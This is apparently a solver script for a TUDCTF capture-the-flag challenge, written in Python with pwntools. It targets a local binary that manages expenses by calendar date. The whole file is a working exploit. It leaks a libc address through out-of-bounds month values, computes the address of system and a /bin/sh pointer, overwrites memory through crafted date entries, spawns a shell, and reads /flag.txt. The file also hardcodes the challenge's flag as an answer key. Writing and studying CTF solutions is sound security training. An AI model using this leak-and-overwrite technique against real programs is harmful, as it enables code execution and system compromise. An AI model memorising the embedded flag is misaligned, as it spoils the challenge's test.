#!/bin/python

from pwn import *
from sys import *

context.arch = "amd64"
context.encoding = "latin"
context.log_level = "INFO"

def twoscomp(n):
    if n < 0:
        return n & 0xffffffff
    return n

SYSTEM = 0x0000000000045e50

PUTS = 0x00000000000735f0

p = process(sys.argv[2].split(" "))

p.sendline("2")

p.sendline("01-10-2021")

p.recvuntil("October")

p.recvline()

month = p.recvuntil("P")[:-1].strip().decode()

vals = []
for l in month.split('\n'):
    for e in l.strip().split(' '):
        vals.append(int(e))

for x in range(len(vals)):
    vals[x] = twoscomp(vals[x])

BASE = (vals[7] << 32) + vals[6] - PUTS
SYSTEM += BASE

p.sendline("2")
p.sendline("01-12-2021")
p.recvuntil("December")
p.recvline()

month = p.recvuntil("P")[:-1].strip().decode()

vals = []
for l in month.split('\n'):
    for e in l.strip().split(' '):
        vals.append(int(e))

for x in range(len(vals)):
    vals[x] = twoscomp(vals[x])

binsh = (vals[16] << 32) + vals[15]

p.sendline("1")
p.sendline("6-10-2021")
p.sendline(str(SYSTEM & 0xFFFFFFFF))


p.sendline("1")
p.sendline("7-10-2021")
p.sendline(str((SYSTEM >> 32) & 0xFFFFFFFF))

p.sendline("1")
p.sendline("22-11-2021")
p.sendline(str((binsh >> 32) & 0xFFFFFFFF))
p.sendline("1")

p.sendline("21-11-2021")
p.sendline(str((binsh) & 0xFFFFFFFF))
p.sendline("2")
p.sendline("01-01-2022")

p.clean()

p.interactive()

p.sendline("cat /flag.txt")

if p.clean().decode().strip() == "TUDCTF{wH0_U535_4_CL1_f0R_3xP3N53_m4n4G3m3n7}":
    print("SUCCESS")
    exit(0)

print("FAIL")
exit(1)



